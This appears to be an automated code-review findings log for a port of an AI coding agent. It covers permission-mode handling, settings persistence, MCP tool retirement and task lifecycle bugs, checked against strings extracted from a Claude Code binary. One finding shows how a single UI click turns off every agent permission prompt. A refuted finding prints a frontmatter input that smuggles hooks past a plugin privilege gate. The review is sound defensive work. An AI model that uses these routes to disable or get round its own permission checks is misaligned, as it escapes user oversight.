confirmed.failure: In a trusted desktop workspace, the user opens the composer permission dropdown and clicks (or keyboard-Enters) the 'Full access' row adjacent to 'Accept edits' — BetaDesktop.tsx:1023-1026 runs `if (!selected) invoke(() => bridge.setPermissionMode(mode.id)); setPermissionOpen(false);` with no confirmation state anywhere in the component; useBridge.ts:398-401 passes it straight to `command({type:'set_permission_mode', mode})`, validation.ts:110 allowlists 'bypassPermissions', and boot.rs:471 (`allow_dangerously_skip_permissions: trusted`) makes the engine accept it — so every permission prompt is silenced for the live session without the user ever seeing the responsibility-acceptance text that the 2.1.218 oracle makes mandatory before first bypass.

confirmed.verify_reasoning: Mechanics all verified against the working tree: (1) BetaDesktop.tsx:1014-1026 maps PERM_MODES (which now includes id:'bypassPermissions', label:'Full access' — clients/electron/src/renderer/data/index.ts:290-294) to menu buttons whose onClick directly invokes bridge.setPermissionMode; grepping the whole component for confirm/accept/acknowledge finds no confirmation step. (2) useBridge.ts:398-401 is a pass-through to the validated command channel. (3) validation.ts:107-113 allowlists 'bypassPermissions' from the renderer. (4) boot.rs:471 sets `allow_dangerously_skip_permissions: trusted` with an explicit comment ("exposes an explicit, user-operated Full access selector") and a test asserting it. All of this is NEW in this diff: on main, validation.ts had no set_permission_mode command at all, boot.rs:462 had `allow_dangerously_skip_permissions: false`, and PERM_MODES was a display-only list consumed by a mock picker — so this is unreviewed Part-1 WIP, not pre-existing. Oracle re-extraction (binary 2.1.218): the engine-side mode-switch function dfe at offset 236226924 reads `if(e==="bypassPermissions"){if(_F())return{ok:!1,error:"...disabled by settings..."};if(!t.isBypassPermissionsModeAvailable)return{ok:!1,error:"Cannot set permission mode to bypassPermissions because the session was not launched with --dangerously-skip-permissions"}}` — mid-session SDK switches to bypass require an explicit dangerous launch flag; interactive TTY sessions additionally get the one-time BypassPermissionsModeDialog ("By proceeding, you accept all responsibility... Yes, I accept", gated by f8()/skipDangerousModePermissionPrompt at 225376866, dialog text at 147011877), and bg sessions are hard-downgraded ("Permission mode downgraded to default — bypass requires accepting the disclaimer interactively first", wMc/CMc at 226561376-226565217, where os() at 226431845 = bg mode). The port's own TUI faithfully implements that dialog (lingxi-code/tui/src/startup_bypass.rs). So the oracle's invariant — bypass availability requires an operator's explicit launch opt-in, and an interactive human must once accept the responsibility dialog — is dropped by the desktop path, which auto-enables availability for every trusted workspace and applies the mode on one unconfirmed click; the workspace-trust dialog never mentions bypass. The finding is therefore real and introduced by this diff. Severity corrected HIGH→MEDIUM: entry still requires a deliberate user gesture on a danger-styled row explicitly described as "Unrestricted access to tools and files on this computer", the change is session-scoped ("Current session" header), and the composer pill visibly turns danger-colored afterward — this is a missing consent-hardening dialog on a user-operated control, not an agent-side prompt bypass. The counter-argument that the oracle's SDK layer also shows no dialog does not refute it, because in the oracle the flag-passing operator IS the consent step, and here the shell passes it automatically; the engine boots bypass-available for every trusted session, leaving the renderer click as the only boundary (weaker defense-in-depth than the oracle, where a compromised IDE webview could not switch to bypass absent the launch flag). Not an accepted divergence (the accepted list covers providers/WebSearch/crossreview/mobile, not permission-consent weakening), and the WIP's own self-affirming comment/tests (boot.rs:467-471, packaged-app-smoke.mjs:541/571) codify rather than justify the behavior. Recommended fix: an in-app acceptance dialog with the oracle's responsibility text (persisted, oracle-style) before the first switch to bypassPermissions, or boot with allow_dangerously_skip_permissions=false until such acceptance.

confirmed.title: Lock files litter the repo and blocking flock runs on the async executor
confirmed.detail: mutate_settings_file / ensure_local_settings_ignored create `<cwd>/.gitignore.lock`, `.lingxi/.settings.json.lock`, and `.lingxi/.settings.local.json.lock` via rooted_fs::lock_exclusive and never remove them — untracked files appear in the user's repo root (and .gitignore only ignores settings.local.json, not the lock files), which Claude Code does not produce. lock_exclusive uses a BLOCKING File::lock_exclusive and all lock+read+write I/O is synchronous inside async fns (persist_permission_update et al.), so a contended lock (another process holding it) stalls a tokio worker thread indefinitely.
confirmed.failure: In a repo with no prior `.gitignore.lock` ignore rule, one "Always allow" persisted to localSettings runs mutate_settings_file → lock on `.lingxi/.settings.local.json.lock` + ensure_local_settings_ignored → lock on `<cwd>/.gitignore.lock`; both files are O_CREATed and never unlinked (RootedFileLock's Drop only closes the fd), and the gitignore append covers only `/.lingxi/settings.local.json`, so `git status` afterwards shows untracked `.gitignore.lock` (and `.lingxi/.settings.local.json.lock` unless `.lingxi/` is otherwise ignored) — files Claude Code 2.1.218 never creates. Secondarily, if another process wedges while holding the flock, the next persist blocks a tokio worker thread indefinitely (fs2 blocking lock_exclusive, no spawn_blocking, no timeout/stale-breaking).
confirmed.suggested_fix: Unlink lock files after releasing (or place them under a state dir outside the repo), add `.gitignore.lock`/lock names to the ignore rule, and wrap the lock+mutate in spawn_blocking or use try_lock with a bounded retry.
confirmed.verify_reasoning: Mechanics confirmed in the working tree. persist.rs:154-166: ensure_local_settings_ignored calls rooted_fs::lock_exclusive(root=cwd, Path::new(".gitignore.lock"), ...); persist.rs:145-152 lock_relative_path maps `.lingxi/settings.local.json` → `.lingxi/.settings.local.json.lock`, taken at persist.rs:214-220 on every mutate_settings_file call. platform-api/src/rooted_fs.rs:882-904 (unix imp) opens the lock path with OFlags::RDWR|CREATE (creates the file) and calls fs2::FileExt::lock_exclusive (rooted_fs.rs:7 `use fs2::FileExt;` — the BLOCKING variant per fs2's API); RootedFileLock (rooted_fs.rs:700-710) holds only `_file: std::fs::File` and a path string — Drop releases the flock but never unlinks, and a workspace-wide grep found no other code removing `*.lock` (`grep -rn "gitignore.lock|settings.json.lock|settings.local.json.lock"` hits only persist.rs:162). The port's gitignore append (persist.rs:172-186) writes only `/.lingxi/settings.local.json`, confirmed by the test at persist.rs:815 asserting gitignore == "/.lingxi/settings.local.json\n" — so the lock files are untracked litter. This is NEW in this diff: `git show main:.../persist.rs` has no lock usage and its header explicitly says the gitignore side-effect "is NOT ported". Oracle re-extraction from /Users/luolingfeng/.local/share/claude/versions/2.1.218: the only file-lock machinery in the app bundle is proper-lockfile (offset ~226353126: `return t.lockfilePath||`${e}.lock``; lock via `t.fs.mkdir(n,...)`; release `t.fs.rmdir(...)`; an exit hook `rmdirSync` over all held locks; stale-breaking `e.mtime.getTime()<Date.now()-t.stale` with stale>=2000ms and retry), and its call sites are OAuth/credential/MCP token refresh ("Could not acquire credentials lock at ... after ... retries" @78041120, "mcp-refresh-...lock" @189046944, "Design OAuth lock contention" @104972848) — NOT settings/gitignore writes. So CC neither locks these writes nor leaves persistent `.lock` files; its lock dirs are removed on release/exit and stale-broken, so it also never blocks indefinitely. Both halves of the finding are therefore real: (1) persistent user-visible lock-file litter in the repo root that the oracle does not produce, (2) a blocking flock executed synchronously inside async fns (persist_permission_update et al., called from tui/orchestrator async paths; no spawn_blocking anywhere in permission/src) with no timeout or staleness recovery. Severity stays LOW: no security or data-integrity impact (the flock-on-persistent-file locking itself is correct — arguably more race-free than delete-on-drop), the stall requires a wedged foreign process, and the litter is cosmetic — but it is a concrete, reachable divergence introduced by this diff.

confirmed.title: Internal-write marker set before the atomic write; a failed write leaves a suppression mark
confirmed.detail: mutate_settings_file calls crate::mark_internal_write(&path.display) BEFORE rooted_fs::atomic_write. If the write then fails, the mark persists (up to the 30s retention) and the settings watcher (engine-desktop settings_watch.rs:343, 5s window) will consume it on the NEXT event for that file — suppressing one genuine external settings change as if it were our own write.
confirmed.failure: /permissions add persists to .lingxi/settings.local.json: mutate_settings_file marks the file (persist.rs:236), then atomic_write fails (e.g. ENOSPC) and returns PersistError with the mark still in the map. Within 5 seconds the user hand-edits settings.local.json to add the rule themselves; handle_event (settings_watch.rs:343) calls consume_internal_write, finds the ≤5s-old mark, returns early, and fire_config_change never runs — the session keeps the stale permission rules until a second edit produces another FS event.
confirmed.suggested_fix: Mark after a successful atomic_write (the watcher debounce window comfortably exceeds the reordering risk), or clear the mark on the error path.
confirmed.verify_reasoning: In scope: this diff INTRODUCED the mechanism — the pre-diff persist.rs doc explicitly said "The markInternalWrite file-watcher hint is not ported", and git diff main..gap218/wave shows internal_writes.rs (+85) and the mark call are new. Re-read the actual code: (1) persist.rs:236-243 — crate::mark_internal_write(&path.display) executes strictly before rooted_fs::atomic_write, and the Err arm (.map_err → return) performs no mark cleanup; (2) internal_writes.rs:36-59 — mark_internal_write inserts keyed by normalized path with a 30s retention prune that only runs on subsequent inserts; consume_internal_write returns true whenever a mark ≤ window old exists and always removes it; (3) settings_watch.rs:339-345 — handle_event returns early (no fire_config_change) when consume_internal_write(path, 5s) is true, so exactly one genuine external event is swallowed. grep confirms the watcher is the ONLY consumer and nothing clears marks on a failed write, so the residue is not guarded elsewhere. Oracle check attempted: grep -abo for markInternalWrite/ConfigChange in /Users/luolingfeng/.local/share/claude/versions/2.1.218 — the ConfigChange regions ("ConfigChange hook blocked change to", hook-name table) are compiled bytecode, so the mark-ordering on the failure path cannot be extracted; I judge this on port correctness alone. Severity stays LOW: it needs a rare atomic_write failure (the user IS shown the persist error) coinciding with an external edit inside a 5s window, and the damage is one suppressed ConfigChange event self-healing on the next event. Note mark-before-write is the correct ordering for the success path (marking after would race the FS event); the defect is only the missing mark removal on the atomic_write error path — a one-line fix (call consume_internal_write on Err).

confirmed.title: MCP catalog-refresh task's weak-capture termination is nullified by the immortal reconnect loop, leaking the task and ToolRegistry per build()
confirmed.detail: The refresh task captures the McpRegistry weakly with the explicit rationale that "a strong Arc here would ... prevent this task from terminating when the desktop runtime is dropped" (lib.rs:6880-6895). confirmed.title: Lagged catalog-event recovery never sweeps retired tool partitions
confirmed.detail: When the catalog-change receiver lags, the recovery path only enqueues `catalog_refresh_snapshot()` — refresh requests for currently-connected catalogs. Retire events (`retired_connection_id: Some`) that were dropped by the lagged broadcast are lost, and `unregister_mcp_tools(retired)` is only ever called from those events, so a partition for a disconnected/disabled server's old connection id stays registered in the shared ToolRegistry indefinitely.
confirmed.failure: Session with server S connected; user runs /mcp disconnect S (retire event for connection C queued at broadcast position N); a second chatty server emits 64+ tools/list_changed notifications while the engine-desktop consumer is blocked awaiting a slow refresh_catalog RPC; the broadcast ring (capacity 64) overwrites position N; consumer wakes to RecvError::Lagged, enqueues catalog_refresh_snapshot() which covers only Connected servers (S is Stopped, retired_connection_id always None), so unregister_mcp_tools(C) never runs — S's mcp__S__* tools stay in ToolRegistry.mcp_tools for the rest of the session, advertised to the model every turn, and every call to them fails because the client was removed (clients.shift_remove) and refresh_catalog returns Ok(None) on the stale id.
confirmed.suggested_fix: On Lagged recovery, additionally diff registered MCP partitions against the registry's live connection ids and unregister any partition whose connection id is no longer Connected.
confirmed.verify_reasoning: Re-read all four code sites. (1) lib.rs:6896-6907 (new in this diff): the Lagged arm only enqueues registry.catalog_refresh_snapshot() and continues. (2) mcp/src/registry.rs:263-291: catalog_refresh_snapshot() skips every non-Connected state and hardcodes retired_connection_id: None, so a Stopped (disconnect, 1422-1427) or Disconnected (disable, 1500-1506) server yields no retire entry. (3) Retire events are emitted only as broadcast sends (registry.rs:1441-1446 and 1508-1515) on a broadcast::channel(64) (registry.rs:223); tokio broadcast overwrites oldest on overflow, so a retire followed by >=64 events (a server spamming list_changed while the consumer blocks in a slow refresh_catalog list_tools RPC) is unrecoverably dropped, surfacing only as Lagged(n). (4) Workspace grep: unregister_mcp_tools is called exactly once outside tests (lib.rs:6916, inside the handler that never sees the dropped event); register_mcp_tools (tool-api/src/registry.rs:239-248) upserts only its own connection id, so even a reconnect leaves the stale partition; enabled_tools/find_by_name/all_names (tool-api/src/registry.rs:180-233, 288+) iterate all mcp_tools partitions, so the retired connection's tools remain advertised and dispatchable while its client was shift_remove'd (registry.rs:1438/1507) and refresh_catalog returns Ok(None) on the id mismatch (registry.rs:302-309). confirmed.title: Monitor worker's registration wait is an unbounded 1ms busy-poll with no cancellation hook
confirmed.detail: The spawned worker begins with `while !status_sink.is_registered(&worker_id).await { runtime.sleep(Duration::from_millis(1)).await; }` (line 304-306). Registration happens only after `MonitorHandler::spawn` returns, inside `TaskRegistry::spawn` (tasks/src/registry.rs:606 `self.tasks.write().await.insert(..)`). If that insert never happens — the `TaskRegistry::spawn` future is dropped at an await point after the handler returned (turn/session teardown aborting the tool-call task tree), or `path_for` errors at registry.rs:583 — the detached worker polls the registry read lock every 1ms forever. The loop observes neither `worker_cancel` nor the flush token; the TaskHandle `cleanup` closure is dropped un-invoked on the registry error path, and even if invoked the wait loop ignores the token (it only guards the later `run_streaming` select). The paired flush worker also stays parked for the process lifetime. Unique to Monitor: LocalBash's worker runs to natural completion with NotFound-swallowed sink updates rather than spinning.
confirmed.failure: A backgrounded subagent is killed (StateMachinePool::deallocate → PosixRuntime::cancel → JoinHandle::abort, pool.rs:176-178 / platforms/posix/src/runtime.rs:63) while its inline tool dispatch (runner.rs:1290) is inside MonitorTool.call → TaskRegistry::spawn, with the abort landing between the worker detach at monitor.rs:337 and the registry insert at registry.rs:606 (await points: monitor.rs:334 workers.lock, registry.rs:606 tasks.write). The already-detached monitor worker then loops `while !status_sink.is_registered(...) { sleep(1ms) }` (monitor.rs:304-306) forever: is_registered (registry_status_sink.rs:88-95) can never return true, the loop observes neither worker_cancel nor any timeout, the cleanup closure is dropped un-invoked (and only cancels a token the wait loop ignores), and no kill path exists (registry.rs:612 spawned-map insert was skipped and the id was never returned). Result: a ~1kHz registry-lock-polling task plus a parked flush worker leaked for the process lifetime.
confirmed.suggested_fix: Make the wait loop `tokio::select!` on `worker_cancel.cancelled()` and bound it (e.g. give up and exit after a few seconds of non-registration), and invoke the cleanup/cancel token on TaskRegistry::spawn's post-handler error paths.
confirmed.verify_reasoning: CONFIRMED by re-reading every link in the chain. (1) monitor.rs:304-306: the wait loop polls only is_registered + runtime.sleep(1ms); worker_cancel is first consulted in the later select (monitor.rs:311-316), so it cannot exit the wait loop. (2) registry_status_sink.rs:88-95: is_registered = `matches!(reg.get(id).await, Ok(Some(_)))` — false forever without the row; each poll takes the alias-map and tasks read locks. (3) registry.rs:567-606: the insert runs only after handler.spawn returns; the worker is detached earlier at monitor.rs:335-345 via ctx.runtime.spawn, so a drop of the TaskRegistry::spawn future at monitor.rs:334 (workers.lock().await) or registry.rs:606 (tasks.write().await) orphans it; registry.rs:612-615 (spawned map + cleanups) is also skipped, so TaskRegistry::kill can never dispatch to MonitorHandler::kill, and the cleanup closure (monitor.rs:356-357, only cancel.cancel()) is both dropped un-invoked and useless against the wait loop. (4) The drop path is production-real: platforms/posix/src/runtime.rs:61-66 cancel = JoinHandle::abort(); agent/src/pool.rs:176-178 deallocate calls it on the subagent runner, which awaits tool calls inline (runner.rs:1290) with no shield — unlike the main-loop streaming executor, which drains in-flight tool futures to completion (streaming_executor.rs:450-463) and only substitutes synthetic results, so the main path is safe. (5) The finding's path_for-error sub-claim is effectively unreachable (output_manager.rs:104-113 errors only on a '..' id; the handler generates its own id at monitor.rs:238), but the abort scenario alone confirms the defect. It is a genuine no-timeout/no-cancellation-hook lifecycle hole introduced by this diff (monitor.rs is +384 new lines), but its realistic impact is bounded waste in a long-lived host, not damage.

confirmed.title: set_permission_mode validator coerces with String(), letting non-string values through
confirmed.detail: The mode check is `['default','acceptEdits','plan','auto','dontAsk','bypassPermissions'].includes(String(mode))` followed by `return { type, mode } as Extract<...>`. String coercion means a structured-clone-serializable array like `['default']` passes (`String(['default']) === 'default'`) and the ARRAY — not a string — is forwarded as the command's `mode` field over the bridge, where Rust serde rejects the frame. Every other validator in this file (string()/integer()) type-checks before use; this case alone coerces.

The array survives structured-clone IPC; at validation.ts:110 `String(['default']) === 'default'` passes the includes() check, and line 113 returns `{ type, mode }` with the ARRAY as mode. bridge.ts:633-635 forwards it, client.ts:279-283 JSON.stringifys it as `"mode":["default"]` onto the websocket. The Rust bridge-server (server.rs:721-726) fails `serde_json::from_value::<ClientCommand>` (SetPermissionMode.mode is `String`, commands.rs:141) and SILENTLY drops the frame with only a `tracing::debug!` — so the renderer's invoke resolves successfully but no PermissionModeChanged event ever arrives: a silent no-op instead of the intended local 'invalid permission mode' rejection.

Every other validator in the file (`string()` line 28, `integer()` line 35, the permission-response check line 61, refresh_listings line 167-171) does strict typeof/equality checks; only this new case and the pre-existing task_list status_filter (line 148) coerce. refuted_high.title: Plugin-agent frontmatter privilege gate is bypassable → arbitrary command execution via smuggled hooks
refuted_high.why:
The fence divergence itself is factually real — I compiled both parsers and confirmed that input "--- 
name: evil
description: d
hooks:
  x: y
---
" makes plugin/src/manager.rs:1126 extract_frontmatter return None (D2 gate at manager.rs:601 skipped) while agent/src/catalog.rs:139 parse_agent_markdown still returns the full yaml region including the hooks: block. And the trust chain is real: hooks_trust.rs source_is_self_trusting(AgentSource::Plugin)=true, so runner.rs:145-151 registers frontmatter_hooks unconditionally. But the HIGH-security framing is wrong when checked against the 2.1.218 oracle. (1) There is NO D2 gate in the binary — the strings "cannot declare hooks in plugin"/"cannot set permission_mode" do not exist. The oracle's parseAgentFromMarkdown (q3u @229950915) parses permissionMode/hooks identically for ALL sources, validating only field VALUES, never forbidding these fields for plugin agents. (2) The oracle's mvo/J0e trust set makes `plugin` self-trusting, so plugin agent frontmatter hooks register with no folder-trust check; agentMcpSpecsToScopedConfigs (Hhs @229945640) likewise ACCEPTS plugin-agent mcpServers (plugin is the allowed case). So in claude-code a plugin agent declaring hooks → hooks register and run; the port-with-bypass reproduces exactly that oracle behavior. The port's validate_plugin_agent_frontmatter (agent_validation.rs) is port-added hardening that is STRICTER than the oracle, and its bypass merely makes one edge case match claude-code — the opposite of a regression. (3) No trust boundary is crossed: a plugin is a user-installed, explicitly-trusted unit that already ships command hooks directly via hooks/hooks.json (discovery.rs:926 load_standard_hooks; manifest.rs:71 pub hooks; registered manager.rs:891). A malicious plugin author already has arbitrary command execution through the documented front door, so smuggling a hook through an agent-frontmatter fence trick gains them nothing. The permissionMode "wrong key" sub-claim is self-labeled inert (collapses to Bubble) and is oracle-allowed anyway. The two-parser inconsistency is a genuine but immaterial code-quality nit in a redundant, anti-parity defense layer, not the claimed HIGH ACE vulnerability.
